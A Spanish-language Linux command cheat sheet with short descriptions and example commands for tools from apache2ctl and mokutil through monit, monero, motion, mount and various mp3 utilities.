# apache2ctl -t (probar la configuración de apache)
# systemctl restart apache2 (si sale correctas la configuración, reiniciar)
# apache2ctl -M (comprobar módulos de apache)


module-assistant
Paquete especifico de Debian para la instalación de controladores.
# m-a (abre la interficie ncuses del programa)
# m-a a-i paquete (seleccionar un módulo)
# m-a list (ver lista de paquetes disponibles)


modulos
Comandos relacionados con el manejo de los módulos del kernel
# ls -R /lib/modules/$(uname -r) (Lista todos los modulos disponibles)
# modinfo /ruta_al_modulo/modulo.ko  (Muestra la información de un módulo)
# insmod modulo.ko  (instalar un modulo sin resolver dependencias)
# modprobe modulo.ko  (instalar un modulo incluyendo dependencias)
# depmod -a  (Generar la base de datos de dependencias de los modulos)
# insmod --force modulo.ko (Fuerza la instalación de un módulo)
# modprobe -n -v modulo.ko (Muestra los modulos y sus dependencias)
# lsmod  (Muestra todos los modulos del kernel)
# rmmod modulo.ko  (Elimina un modulo)


mogrify
[imagemagick]. Cambiar formato y redimensionar imágenes de directorios. Se sobreescriben las imágenes.
$ mogrify -format jpg *.png   (Cambiar el formato de varias  imágenes)
$ mogrify -format png -sample 20%x20% *.jpg   (Reducir varias imágenes)
$ mogrify -format png  -thumbnail 10% *jpg (Cambiar formato y crear miniaturas)
$ mogrify -resize 50% *.jpg (reducir todas las imágenes al 50%)
$ mogrify -strip imagen.jpg (eliminar metadatos de una imagen)
$ mogrify -geometry 120x120 *.jpg  (Crear miniaturas)
$ mogrify -quality 60 *.jpg  (Reducir la calidad)
$ mogrify --auto-orient * (Reorientar todo el directorio)
$ mogrify -resize 800 *.jpg (modificar todos los jpg de la carpeta y reducirlos manteniendo la relación a 800 pixels)
$ mogrify -comment "comentario para introducir" salida.jpg (Entrar un comentario en los metadatos)
$ mogrify -label "Texto de la etiqueta" input.jpg (Entrar una etiqueta)
$ mogrify -comment @firma.txt input (Entrar un comentario a partir de un archivo firma.txt)


moggsplit
divide un flujo Ogg multiplexado en archivos separados. Por ejemplo, puede separar un OGM en flujos separados Ogg DivX y Ogg Vorbis, o un archivo  Ogg Vorbis encadenado en dos archivos separados.
$ moggsplit file.ogg


mokutil
Permite registrar y borrar las claves de propietario de la máquina [Machine Owner Keys - MOK] almacenadas en la base de datos de shim. Las claves de propietario de la máquina, son un mecanismo de seguridad en sistemas Linux con arranque seguro [Secure Boot] basado en UEFI. Básicamente, permiten a los usuarios o administradores del sistema agregar sus propias claves de firma de confianza al proceso de verificación de arranque. Esto es útil cuando se necesitan cargar módulos del kernel personalizados, controladores o cargadores de arranque que no están firmados por las claves oficiales de la distribución. De esta forma, se mantiene la integridad del arranque seguro sin necesidad de desactivarlo por completo, evitando que software malicioso o no autorizado se ejecute durante el inicio del sistema. Shim es un cargador de arranque inicial diseñado específicamente para sistemas UEFI con Secure Boot que fue desarrollado para permitir que distribuciones Linux arranquen kernels no firmados directamente por Microsoft, que controla las claves principales de Secure Boot. Shim actúa como un "intermediario" o "traductor" que verifica la firma de los componentes subsiguientes, como GRUB o el kernel, usando sus propias bases de datos internas.
# mokutil --sb-state (verificar el estado de Secure Boot)
# mokutil -l (listar claves MOK enroladas, muestra detalles como hashes y emisores de las claves almacenadas en shim)
# mokutil -d mi_clave.der (borrar una clave MOK)
# mokutil --disable-validation (desactivar validación en shim, útil para depuración, pero reduce seguridad)
# mokutil -t mi_clave.der (verificar si una clave está enrolada)
Nota.- Todos los comandos requieren reinicios para confirmar cambios sensibles, y siempre usar con precaución para no comprometer la seguridad del sistema.
1.-
Enrolar una nueva clave MOK, por ejemplo, para firmar un módulo personalizado:
Primero, generar un par de claves con openssl [ver] para crear un certificado DE).
# mokutil -i mi_clave.der
Ingresar una contraseña temporal. Reiniciar el sistema; y en la pantalla de MokManager, seleccionar "Enroll MOK" y confirmar. Esto agrega la clave a la base de datos de shim.


mold
Enlazador [linker] moderno y de alto rendimiento, diseñado como alternativa a los enlazadores tradicionales de Unix como ld o lld de LLVM. Su objetivo principal es acelerar el proceso de enlazado durante la compilación de programas, lo que es especialmente útil en ciclos de desarrollo rápidos [editar-compilar-depurar]. Un enlazador es una herramienta que combina varios archivos objeto [.o] y bibliotecas en un solo ejecutable o biblioteca. Es una parte esencial del proceso de compilación. Incluye la herramienta ld.mold.
$ gcc -fuse-ld=mold -o mi_programa mi_programa.c (dice a gcc que use mold en lugar del enlazador por defecto)
$ clang -fuse-ld=mold -o mi_programa mi_programa.c (ejemplo con clang)
$ ld.mold -o mi_programa mi_programa.o -lc (invocar mold directamente, aunque es menos común)
1.-
Medir la diferencia de velocidad de enlazado con y sin mold
$ time gcc -o mi_programa mi_programa.c
$ time gcc -fuse-ld=mold -o mi_programa mi_programa.c
Se verá que el segundo comando suele ser mucho más rápido.


molly-brown
Servidor Gemini completo apto para entornos Pubnix o similares de alojamiento compartido, donde los usuarios pueden subir su contenido, pero no tienen acceso al archivo de configuración principal. También es ideal para entornos monousuario, pero su compatibilidad multiusuario lo distingue de muchos otros servidores Gemini. Un servidor Gemini sirve contenido minimalista y ligero al web moderno.
# useradd -M molly (crear un usuario dedicado)
Generar certificados TLS, obligatorios para Gemini; usa un certificado autofirmado para pruebas, reemplazando <tu-dominio>:
# mkdir -p /etc/molly-brown/certs
# openssl req -x509 -newkey rsa:4096 -keyout /etc/molly-brown/certs/gemini.key -out /etc/molly-brown/certs/gemini.crt -days 3650 -nodes -subj "/CN=<tu-dominio>" -addext "subjectAltName = DNS:<tu-dominio>"
# mkdir -p /var/log/molly-brown /var/gemini (crear directorios para logs y contenido)
Ejemplo de archivo de configura
# nano /etc/molly-brown/molly.conf
     Port = 1965
     Hostname = "<tu-dominio>"
     DocBase = "/var/gemini/"
     CertPath = "/etc/molly-brown/certs/gemini.crt"
     KeyPath = "/etc/molly-brown/certs/gemini.key"
     AccessLog = "/var/log/molly-brown/access.log"
     ErrorLog = "/var/log/molly-brown/error.log"
# chown -R molly /var/gemini /etc/molly-brown /var/log/molly-brown (cambiar permisos)
Crear un servicio systemd en
# nano /etc/systemd/system/molly-brown.service
     [Unit]
     Description=Molly Brown gemini server
     After=network.target
     [Service]
     Type=simple
     Restart=always
     User=molly
     ExecStart=molly-brown -c /etc/molly-brown/molly.conf
     [Install]
     WantedBy=multi-user.target
# systemctl start molly-brown (iniciar servicio)
# systemctl enable molly-brown (habilitar servicio al inicio)
Ahora, colocar archivos .gmi [Gemtext] en /var/gemini/ y acceder vía un cliente Gemini como gemini://<tu-dominio>/.
En un entorno multiusuario, un usuario podría cargar contenido en /var/gemini/users/usuario/ y acceder vía gemini://dominio/~usuario/, sin tocar la config principal.
El comando principal es `molly-brown`, que se ejecuta desde la línea de comandos. Puede funcionar sin archivo de configuración usando valores predeterminados (por ejemplo, sirviendo contenido desde el directorio actual en el puerto 1965), pero para un uso real se recomienda un archivo de config en formato TOML (por ejemplo, `/etc/molly.conf` o `/etc/molly-brown/molly.conf`).


molly-guard
Protege las máquinas de apagados/reinicios accidentales. El paquete instala un sript de shell que mueve los comandos reales: shutdown, reboot, halt, poweroff, coldreboot, pm-hibernate, pm-suspend al directorio /lib/molly-guard/. Primero, ejecuta un conjunto de scripts, que deben finalizar correctamente, antes de que molly-guard invoque el comando real. Uno de los scripts comprueba si hay sesiones SSH existentes. Si alguno de los cuatro comandos se ejecuta interactivamente a través de una sesión SSH, el script de shell le solicita que introduzca el nombre del host que desea apagar. Esto debería evitar apagados y reinicios accidentales. Incluye los binarios coldreboot, halt, pm-hibernate, pm-suspend, pm-suspend-hybrid, poweroff, reboot y shutdown. Puede omitir molly-guard ejecutando esos binarios directamente.
$ ls -l /sbin/{halt,reboot,shutdown,poweroff} (comprobar si Molly Guard está activo y reemplazó los binarios originales con enlaces simbólicos a Molly Guard)
1.-
Cuando se intenta reiniciar un servidor remoto vía SSH:
# reboot
       W: molly-guard: SSH session detected!
       Please type in hostname of the machine to reboot:
Si se introduce mal el nombre:
       Please type in hostname of the machine to reboot: otrohost
       Good thing I asked; I won't reboot plsdontreboot ...
       W: aborting reboot due to 30-query-hostname exiting with code 1.
Pero si lo haces correctamente:
       Please type in hostname of the machine to reboot: plsdontreboot
       Broadcast message from root@plsdontreboot:
       The system is going down for reboot NOW!
También permite cancelar un apagado sin comprobaciones:
# shutdown -c
       I: executing shutdown "-c" regardless of check results.
2.-
Forzar la protección en todo tipo de sesión:
# nano /etc/molly-guard/rc
Descomentar la linea:
     ALWAYS_QUERY_HOSTNAME=true
Y pedirá confirmación incluso desde consolas locales.


mom
[Memory Overcommitment Manager Daemon]. Es una herramienta basada en políticas para gestionar la sobreasignación de recursos, principalmente memoria en hosts KVM. Su función principal es monitorizar las máquinas virtuales [VMs] activas y el host para luego ajustar dinámicamente los recursos asignados a las VMs, como el uso de memory ballooning o inflado de memoria basándose en un conjunto de políticas configuradas. Recolecta datos utilizando libvirt o vdsm en entornos oVirt/RHV, para obtener métricas del host y de los invitados. Estos datos incluyen uso de CPU, uso de memoria, páginas de memoria ballooned [reclamadas], y más, provenientes de interfaces del sistema [/proc], APIs de libvirt, o incluso programas cliente dentro de las VMs.
$ momd -v 4 (nivel de detalle del registro em máximo [de 0 a 4]
# systemctl start momd (inicia el servicio)
# systemctl enable momd (configura el demonio para que inicie automáticamente al arrancar el sistema)


mon
Herramienta para monitorear la disponibilidad de servicios y enviar alertas sobre eventos prescritos o fallas en un entorno servidor-cliente. Los servicios se definen como cualquier cosa probada por un programa de "monitorización", que puede ser algo tan simple como hacer ping a un sistema o tan complejo como analizar los resultados de una transacción a nivel de aplicación. Logs en /var/log/mon/ si está activo el servicio se puede monitorear datos con la dirección http://127.0.0.1:2583/ en el navegador.
# monshow --full
# mon -d -S (en modo debug e iniciar con el planificador detenido)
# mon -s /home/USER (epecificando ruta para monitorear scripts)


monado-cli
Es parte del ecosistema OpenXR, un estándar abierto de Khronos para interactuar con dispositivos de realidad virtual [VR] y aumentada [AR], sin depender de drivers propietarios, como los de Oculus, SteamVR, etc. Monado intenta ser una capa universal que detecta y gestiona visores, mandos, cámaras y sensores XR, para que las aplicaciones OpenXR puedan funcionar en Linux.
$ monado-cli test (ejecuta una prueba completa de inicialización e intenta comprobar que todo el stack funciona aunque no haya dispositivos físicos)
La salida muestra, además de muchas información:
   	  Creating instance! --> crea una sesión de OpenXR.
	  Probing! --> busca hardware XR conectado.
	  Dumping! --> imprime lo que encuentra.
	  Creating system devices! --> inicializa los builders.
	  All ok, shutting down --> todo fue bien.
	  Exiting '0' --> se cierra con éxito.
$ monado-cli probe (lista los posibles "builders" de dispositivos y luego destruye lo que ha creado [Destroying probed devices])


monero
Cliente de criptomonedas para la red Monero. El cliente completo de Monero, también conocido como Monero Core, es una billetera de nodo completo para la red Monero. Monero [XMR] es una criptomoneda de código abierto que prioriza la privacidad y la descentralización. Utiliza un libro de contabilidad público para registrar las transacciones, mientras que las nuevas unidades se crean mediante un proceso llamado minería. Monero busca mejorar el diseño de criptomonedas existentes ocultando el remitente, el destinatario y el monto de cada transacción realizada, además de hacer que el proceso de minería sea más igualitario. El historial de transacciones global completo [blockchain] se almacena localmente, lo que puede requerir una gran cantidad de espacio en disco. Incluye los ejecutables monero-blockchain-ancestry, monero-blockchain-depth, monero-blockchain-export, monero-blockchain-import, monero-blockchain-mark-spent-outputs, monero-blockchain-prune, monero-blockchain-prune-known-spent-data, monero-blockchain-stats, monero-blockchain-usage, monero-gen-ssl-cert, monero-gen-trusted-multisig, monero-wallet-cli, monero-wallet-rpc y monerod.
$ monerod (conectar a la red Monero y descargar y mantener una copia de la cadena de bloques [blockchain]. Puede tardar horas o días la primera vez)
$ monerod --rpc-bind-ip 0.0.0.0 --confirm-external-bind (iniciar el nodo y permitir conexiones externas)
$ monerod --detach (ejecuta el daemon en segundo plano, liberando la terminal)
$ monero-blockchain-import --input-file /ruta/a/blockchain.raw (descargas la blockchain fuera del proceso del daemon para acelerar la sincronización inicial)
$ monero-wallet-cli --generate-new-wallet /ruta/a/mi_monedero (crear un monedero. Pedirá eligir una contraseña y mostrará la semilla mnemotécnica [clave de 25 palabras])
$ monero-wallet-cli --wallet-file /ruta/a/mi_monedero  (carga el archivo de monedero especificado)
$ monero-wallet-cli --daemon-host monero.node.url:18081 (conectarta a un nodo público remoto)
Nota.- "monero-wallet-cli" requiere que monerod esté en funcionamiento y sincronizado o conectado a un nodo remoto.
Una vez que has abierto el monedero con monero-wallet-cli, se entra en una interfaz interactiva donde se pueden usar comandos específicos:
balance --> Muestra el saldo disponible y transferible y el saldo bloqueado/pendiente
transfer 47FfL8V...b7gA 1.50 --> Envía 1.50 XMR a la dirección especificada
address --> Muestra tu dirección pública de Monero para recibir fondos
show_transfers in --> Muestra solo las recibidas
show_transfers all --> Las muestra todas
seed --> Muestra la semilla mnemotécnica. Usar en privado y con seguridad
start_mining 2 --> Permite hacer minería de Monero desde el propio monedero, usando 2 cores de la CPU para minar
Nota.- El manejo de criptomonedas requiere precaución extrema. Guardar la semilla mnemotécnica de forma segura y fuera de línea, ya que es la única forma de recuperar los fondos si se olvida la contraseña o si la computadora falla.


monfailures
Programa que enumera los últimos fallos de la aplicación mom [ver].
# monfailures


monit
Monitorizador de procesos en ejecución, servicios, demonios, espacios de disco, PIDs, checksums, archivos....
# monit status (Acceder a los informes)
# monit -t (Comprobar errores de configuración [Control file syntax OK])
# monit -h (Listado de comandos disponibles)
# monit quit (Salir)
# monit start all (Arrancar todos los monitoreos)
# monit sotp ssh (Parar un monitoreo de un servicio)
# monit restart all (Reiniciar todos los monitoreos)
# monit summary (Mostrar resumen)
Configuración:
	# nano /etc/monitrc
Las entradas globales empiezan por “set” y los servicios concretos por “check”
Tiempo de actualización de datos, por defecto:
	set daemon  60
Especificar el archivo de eventos (logs)
	set logfile /var/log/monit.log
Configurar para el envio de notificaciones:
	set mailserver localhost
	set alert usuario@localhost.localdomain
	set mail-format {
	from: monit@$HOST
	subject: $SERVICE $EVENT
	message: $ACTION $SERVICE at $DATE on $HOST: $DESCRIPTION.
	}
	set mailserver mail@mail.com (servidor smtp que envia los correos [localhost para notificación local]).
	set alert user@hots.com  (cuenta donde enviar los mensajes de alerta). Ejemplo para enviar notificaciones a correo gmail (en negrita los datos a modificar):
	set mailserver smtp.gmail.com port 587
	username usuario@gmail.com password Tfer7¿-6j
	using tlsv1
	with timeout 30 seconds
	set alert usuario@gmail.com
	Cambiar usuario y contraseña (por defecto: admin/monit)
	allow usuario:contraseña
Especificar desde donde accederemos. Sólo acceso local [localhost:2812]:
set httpd port 2812 and use address localhost
allow localhost
o si queremos acceso remoto [http://ip_o_host:2812] modificar por:
	set httpd port 2812
         allow localhost
Tambien podemos especificar: ips, rangos, hosts concretos o usuarios para solo lectura:
	allow 192.168.1.14
	allow 192.168.1.1/24
	allow host.com
	allow usuario:contraseña read-only
Modificar el nombre del equipo [tiene que estar en /etc/hosts] y adaptar los porcentajes de consumo de carga del sistema [loadvg] y cpu para que al superar ciertos índices o porcentajes, envie una alerta:
check system tux
    if loadavg (1min) > 4 then alert
    if memory usage > 75% then alert
    if swap usage > 85% then alert
    if cpu usage (user) > 70% then alert
    if cpu usage (system) > 70% then alert
    if cpu usage (wait) > 70% then alert
Configurar el monitoreo de apache (Las rutas a los ficheros pertenecen a una distro arch):
check process apache with pidfile /run/httpd/httpd.pid
    start program = "/etc/rc.d/httpd start" with timeout 60 seconds
    stop program  = "/etc/rc.d/httpd stop"
    if cpu > 80% for 5 cycles then restart
    if totalmem > 1500.0 MB for 5 cycles then restart
    if children > 250 then restart
    if cpu usage > 95% for 3 cycles then restart
    if failed port 80 protocol http then restart
Configurar monitoreo de ssh
check process ssh with pidfile /run/sshd.pid
    start program = "/etc/rc.d/sshd start" with timeout 60 seconds
    stop program  = "/etc/rc.d/sshd stop"
    if cpu > 80% for 5 cycles then restart
    if totalmem > 1500.0 MB for 5 cycles then restart
    if children > 250 then restart
    if cpu usage > 95% for 3 cycles then restart
    if failed port 22 protocol ssh then restart
Chequear determinados puertos:
check host localhost with address localhost
      if failed icmp type echo count 10 with timeout 15 seconds
         then alert
      if failed port 22 proto ssh then alert
      if failed port 25 proto smtp then alert
      if failed port 80 proto http then alert
Monitorear ciertos archivos de configuración [de apache y ssh] para que alerte si modifica el checksum:
    check file httpd.conf with path /etc/httpd/conf/httpd.conf
    if changed checksum then alert
    check file ssh_config with path /etc/ssh/ssh_config
    if changed checksum then alert
Monitorizar directorios para que envie una alerta en caso de modificación:
            check directory sbin with path /sbin
	    if changed timestamp then alert
Monitorizar dispositivos /dev/ [discos duros, usb...] para que avise en caso de sobrepasar determinado espacio en disco o lo desmonte al llegar a cierto porcentaje:
	check device sda5 with path /dev/sda5
	start = “/bin/mount /dev/sda5”
	stop = “/bin/umount /dev/sda5”
	if space usage > 90% then alert
	if space usage > 98% then stop
Si, al pasar algún evento queremos lanzar un script algunos ejemplos para hacerlo son:
1.- Cuando la carga del sistema sobrepasa el indice 5 alertará y si supera el 20 ejecutará el script:
check system dominio.com
    if loadavg (1min) > 5 then alert
    if loadavg (1min) > 20 then exec "/bin/bash /root/script.sh"
2.- Si falla el servidor ftp [puerto 21], al pasar 20 segundos alertará  y ejecutará el script
if failed port 21 protocol ftp with 20 seconds then alert and exec “/ftp/script.sh”


monitoring-plugins
Este metapaquete instalará el conjunto completo de plugins para sistemas de monitorización compatibles con Nagios.


monitorix
Herramienta para monitorizar sistemas y diseñada para controlar la mayor cantidad posible de servicios y recursos. Una vez activado el servicio con::
# service monitorix start
Se accede a los informes con el navegador y la dirección http://localhost:8080/monitorix
Podemos ajustar título y otros parámetros en el archivo /etc/monitorix/monitorix.conf


monshow
[mon]. Mostrar el estado operativo del servidor mon. Están disponibles tanto con la interfaz de línea de comandos como la interfaz web [http://127.0.0.1:2583/].
# monshow --full (solo mostrar los servicios que fallan)


montage
[imagemagick]. Crear una imagen con la unión de varias y modificar imágenes.
$ montage *.png salida.jpg (Con todas las imagenes del directorio)
$ montage -adjoin imagen.png imagen.png resultado.png
$ montage -monochrome entrada.png salida.png (convertir a blanco y negro)
$ montage -title “En el lago” entrada.png salida.png (poner título)
$ montage *.png -mode concatenate -tile 10x all.png (Imagen con todas las imágenes del directorio)
$ montage -geometry +1+1 -tile 2x2 *.png salida.png
$ montage *.png -tile 2x5 -geometry 227x147+1+1 salida.png (Colocará todos los png de la carpeta y los colocará en páginas de 10 con la geometria indicada y con una separación de 1 pixel entre ellos


moodplug-tools
[libmodplug1 libmodplug-tools]. Herramientas de consola de reproducción de Modplug. Estos son reproductores de línea de comandos para los siguientes formatos de módulo: 669, amf, ams, dbm, dmf, dsm, far, it, j2b, mdl, med mod, mt2, mtm, okt, psm, ptm, s3m, stm, ult, umx, xm. Los Modplug no son módulos del kernel, son archivos de música de los 90 que contienen notas musicales, como partituras digitales, samples, grabaciones de sonidos reales, efectos y patrones. En https://modarchive.org/ hay miles de módulos gratis
$ modplug123 /usr/share/bb/bb2.s3m (reproducir un tema)
$ modplug123 --loop cancion.mod (reproducir en bucle)
$ modplug123 --info tema.s3m (listar información del archivo)
$ find /usr -name "*.xm" -o -name "*.mod" -o -name "*.s3m" 2>/dev/null (buscar módulos para probar, en Debian vienen algunos ejemplos)
$ modplug123 --wav salida.wav entrada.xm (convertir a WAV)


morbig
Es un analizador para scripts de shell escritos en el lenguaje de scripts de shell POSIX. Analiza los scripts estáticamente, es decir, sin ejecutarlos, y construye un árbol sintáctico concreto para cada uno. Los árboles sintácticos concretos se construyen mediante constructores según la gramática de shell del estándar POSIX. Este paquete contiene la herramienta de análisis que permite analizar scripts de shell y obtener su árbol sintáctico concreto en varios formatos.
$ morbig --as simple --display-stats --continue-after-error script?.sh (la salida en formato json simple [script1.sh.sjson, script2.sh.sjson...], que muestre total de archivos de entrada procesados, omitidos y rechazados por pantalla y que escriba el mensaje de error en el archivo de salida en lugar de en stderr y que continúe con el siguiente archivo)


more
Pagina el fichero que se especifique
$ cat /etc/apt/sources.list | more (como tuberia)
$ more -5 -d /etc/apt/sources.list  (de cinco en cinco lineas y mostrando teclas de ayuda)
atajos:
	espacio (adelanta una pantalla)
	enter (avanza una linea)
	b (retrocede una pantalla)
	/ (busca la palabra introducida a continuación)
	n (busca la siguiente  concurrencia a buscar)
	q (Salir del programa)


moreutils
Colección cada vez mayor de herramientas Unix. Incluye las siguientes utilidades: chronic [ejecuta un comando silenciosamente a menos que falle], combine [combina las líneas en dos archivos usando operaciones booleanas], errno [busca nombres y descripciones de errno], ifdata [obtiene información de la interfaz de red sin analizar la salida de ifconfig], ifne [ejecuta un programa si la entrada estándar no está vacía], isutf8 [comprueba si un archivo o entrada estándar es utf-8], lckdo [ejecuta un programa con un bloqueo mantenido], mispipe [canaliza dos comandos, devolviendo el estado de salida del primero], paralel [ejecuta varios trabajos a la vez], pee [entrada estándar en T a las tuberías], sponge [absorbe la entrada estándar y escribe en un archivo], ts [entrada estándar de marca de tiempo], vidir [edita un directorio en tu editor de texto], vipe [inserta un editor de texto en una tubería] y zrun [descomprime automáticamente los argumentos del comando]


morse
Codifica un texto a lenguaje morse.
$ morse -s linux es un sistema genial


morsegen
Programa que implementa el estándar internacional del código Morse al convertir letras de texto ASCII en notación de código morse ASCII.
$ morsegen file.txt > morse.txt (convertir a morse el texto del archivo mencionada y guardarlo en morse.txt)


mosaic
El abuelo de los navegadores (1993)
# apt-get install build-essential lesstif2-dev libjpeg62-dev libpng12-dev x11proto-print-dev libxmu-headers libxpm-dev libxmu-dev
$ git clone https://github.com/alandipert/ncsa-mosaic.git
$ cd ncsa-mosaic
	$ make linux
	....
	* Welcome to NCSA Mosaic.
	make[1]: Leaving directory `/home/templix/ncsa-mosaic'
$ cd src
$ ./Mosaic


mosh
Un ssh mejorado.
$ mosh usuario@host
$ mosh -p 5000 usuario@host


most
Paginar archivos tipo more y less
$ most archivo.txt


motion
Video vigilancia por acceso remoto. La configuración que viene por defecto es  suficiente, aunque siempre puede pulirse. Aquí se tratará solo de los mínimos parámetros a modificar para tener motion funcional en local y en remoto .
Abrir los puertos 8080 y 8081 del router y del firewal (Si no se modifican los por defecto)
En debian y derivados
	# nano /etc/motion/motion.conf
	daemon on    (Permitir actuar como demonio)
	webcam_localhost off   (permitir acceso remoto)
	# nano /etc/default/motion
	start_motion_daemon=yes
	# /etc/init.d/motion start
En arch
	# nano /etc/motion/motion.conf
	daemon on
	webcam_localhost off
	Y, si no se va a usar base de datos, comentar los parámetros del 	apartado mysql:
	#sql_log_image on
	#sql_log_snapshot on
	#sql_log_mpeg off
	#sql_log_timelapse off
	#sql_query insert ....
	# mkdir /var/run/motion  (Crear directorio para el PID)
	No existe el /etc/default/motion
	# /etc/rc.d/motion start
Para acceder a la cámara desde el navegador:
http://ip_o_host:8081
Para acceder a la configuración:
http://ip_o_host:8080
En este caso descomentar/modificar en /etc/motion/motion.conf
control_localhost off    (para acceder a la configuración remotamente)
control_authentication username:password (Pide identificación)
substituir por los datos correctos, por ejemplo:
control_authentication juanito:password


mount
Montaje de particiones
# mount -t ext3 (Lista las particones ext3 montados)
# mount -a (Monta todo lo que contengan la expresion  "auto" en el /etc/fstab)
# mount -s (Tolera opciones de montaje medio malas en vez de fallar)
# mount -o loop imagen.iso /directorio (Montar una iso en un dir)
# mount -t vfat /dev/sdf /media/disk -o force,rw (Forzar montaje lectura y escritura)
# mount -t ext4 | column -t (muestra archivos ext4 montados de forma ordenada)
# mount -o remount / (Remontar una partición después de, por ejemplo modificar sus atributos (4ª columna) en el fstab)
# mount -o remount,rw,relatime / (Remontar una partición modificando atributos sólo para la presente sesión)


mountpoint
Comprueba si el directorio o archivo dado se menciona en el archivo /proc/self/mountinfo.
          $ mountpoint /dev/pts
          /dev/pts is a mountpoint


mozilla-devscripts
Este paquete contiene una colección de scripts diseñados para empaquetar las extensiones de Firefox e Icedove. Estas herramientas ayudarán a los mantenedores a compilar, enlazar e instalar correctamente todas las extensiones XUL, siguiendo las políticas descritas por el equipo de mantenedores de extensiones de Debian y Mozilla. Los cripts son: amo-changelog, dh_webext, dh_xul-ext, install-xpi, moz-version, xpi-pack, xpi-repack y xpi-unpack.


mp3blaster
Reproductor de música.
Atajos
	F1 (Añadir ficheros a la lista)
	F3 (Seleccionar todo recursivamente)
	Retroceso (Subir un directorio)
	Espacio (Seleccionar archivo)
	U (Deseleccionar todo)
	D (Eliminar fichero)
	< / > (Bajar / bajar volumen)
	q (Salir del programa)
	? (Mostrar ayuda)
	Enter (Entrar)
	Inicio	(Ir al principio de la lista)
	Fin (Ir al final de la lista)
	4 (Canción anterior)
	5 (Reproducir/Pausar canción)
	6 (Canción siguiente)
	1 (Retroceder canción)
	2 (Detener canción)
	3 (Avanzar canción)


mp3burn
Herramienta útil para grabar CDs de audio directamente desde archivos MP3, Ogg Vorbis o FLAC, sin necesidad de convertir todo el contenido a WAV o CDR antes de grabar. Los archivos .mp3/.ogg/.flac se convierten mediante un decodificador, pero se escriben en FIFO [tuberías con nombre] para no consumir espacio durante la grabación con archivos temporales.
$ mp3burn ~/Musica/*.mp3 (grabará todos los archivos MP3 en el directorio especificado)
$ mp3burn -d /dev/cdrw archivo1.mp3 archivo2.ogg archivo3.flac (usar un dispositivo de grabación específico y grabar una lista específica de archivos)
$ mp3burn -n ~/Musica/*.mp3 (simulación y ver si todo está correcto antes de grabar)
$ mp3burn -x 4 ~/Musica/*.mp3 (especificar la velocidad de grabación, por ejemplo, 4x)
$ mp3burn -e ~/Musica/*.mp3 (forzar la sobregrabación si el CD es regrabable)


mp3cd
Graba CD de audio normalizados a partir de listas de MP3/WAV/Oggs/FLAC. El script se encarga de corregir los WAV remuestreándolos si es necesario y normalizando el volumen en todas las pistas. Admite la lectura de etiquetas y la grabación de CD-TEXT.
Asegurar que /dev/cdrecorder apunte a la grabadora, sino crear el enlace:
# ln -s /dev/sr0 /dev/cdrecorder
$ mp3cd -h (ayuda breve)
$ mp3cd --help (ayuda detallada)
$ mp3cd --longhelp (asyuda completa).
$ mp3cd lista.m3u (limpia directorio temporal, decodifica los WAV, corrige formatos, normaliza volúmenes, genera TOC y graba el CD. Incluye CD-TEXT si es posible)
$ mp3cd ~/Musica/cancion1.mp3 ~/Musica/cancion2.ogg ~/Musica/cancion3.flac (trata la lista como una playlist temporal y procede con el proceso completo)
$ mp3cd -s decode -q lista.m3u (inicia en la etapa de decodificación [convierte MP3/Ogg/FLAC a WAV] y "-q" sale después de completar esa etapa)
$ mp3cd -s norm -q lista.m3u (normalizar solo volúmenes)
$ mp3cd -n lista.m3u (realiza todas las etapas hasta el TOC, pero simula la grabación sin escribir en disco y verifica que los archivos quepan en un CD [máx. ~80 minutos])
$ mp3cd --skip norm,burn lista.m3u (salta la normalización [norm] y la grabación [burn], pero hace el resto)
$ mp3cd -v -t /tmp -d /dev/sr0 lista.m3u (ver comandos ejecutados, especificar directorio temporal y dispositivo de grabación)
$ mp3cd -s burn (verifica el CDR y graba directamente desde el TOC existente en el directorio temporal)
$ mp3cd -T -c "speed=8" lista.m3u ("T" si la grabadora no soporta CD-TEXT y pasar a cdrdao una velocidad específica)
Nota.- Ante cualquier fallo, revisar tool-output.txt en /tmp/mp3cd-$USER para ver errores.


mp3check
Utilidad para la detección de mp3 incompletos o con errores.
$ mp3check 3 -e -r . (sólo los mp3 del presente directorio de forma recursiva y verificar la coherencia y encabezados e imprimir los mensajes de error)


mp3fs
Es un sistema de archivos virtual de solo lectura basado en FUSE [Filesystem in Userspace], diseñado específicamente para transcodificar archivos de audio de alta calidad, principalmente FLAC, y en versiones recientes también Ogg Vorbis a formato MP3 en tiempo real. Esto significa que, cuando se abre o lee un archivo en el sistema de archivos montado, mp3fs no crea copias físicas de los archivos MP3; en su lugar, genera el contenido MP3 "sobre la marcha" mediante un proceso de conversión dinámica.
Permitir montajes como usuario normal:
# nano /etc/fuse.conf
Descomentar la linea:
	 user_allow_other
$ mp3fs -b 128 ~/Musica/FLAC /tmp/mp3 (montar el directorio con bitrate 128 kbps)
Una vez montado, se puede navegar el punto_de_montaje como un directorio normal. Los archivos FLAC aparecerán con extensión .mp3 y se transcodificarán al leerlos, con un reproductor como VLC o al copiarlos.
$ fusermount -u /tmp/mp3 (desmontar)
$ mp3fs -o allow_other,ro,bitrate=192 /mnt/musica_flac /mnt/mp3_servidor (otros usuarios pueden acceder, refuerza solo lectura y calidad media-alta)


mp3gain
Analiza y ajusta archivos MP3 para que tengan el mismo nivel de volumen.
$ mp3gain -r -k *.mp3 (Normaliza todos los archivos  del directorio)
$ find . -type f -iname '*.mp3' -print0 | xargs -0 mp3gain -r -k (genera una lista de los archivos mp3 contenidos en la carpeta actual, crea una tuberia con el resultado de la lista, y normaliza)
$ find directorio -iname “*.mp3″ -exec mp3gain -r -k -m 5 (normaliza un directorio y sus subdirectorios)


mp3guessenc
Utilidad para analizar archivos de audio MPEG. Identifica si un archivo MP3 fue codificado con LAME, Fraunhofer, iTunes, etc, detecta si el archivo es CBR [Constant Bitrate] o VBR [Variable Bitrate], verifica si hay inconsistencias en los metadatos del archivo y diagnostica archivos corruptos o mal etiquetados.
$ mp3guessenc -v cancion.mp3 (analizar un archivo MP3 en modo detallado)
$ mp3guessenc *.mp3 (analizar todos los .mpe del directorio)
$ mp3guessenc -g cancion.mp3 (solo informar como está codificado)
$ mp3guessenc -i cancion.mp3 (mostrar etiquetas de información de metadatos)
$ mp3guessenc -m (Mostrar detalles de la transmisión mpeg)
$ mp3guessenc -s (muestra la cadena del codificador)


mp3info
Información sobre las etiquetas ID3 de archivos mp3blaster
$ mp3info archivo.mp3 (Ver la información ID3)
$ mp3info -t titulo -a artista -l album -y año -c comentario -n pista -g genero archivo.mp3
(Entrar información ID3 para un archivo mp3)


mp3rename
Renombra ficheros mp3 según sus propias etiquetas [id3 tag]
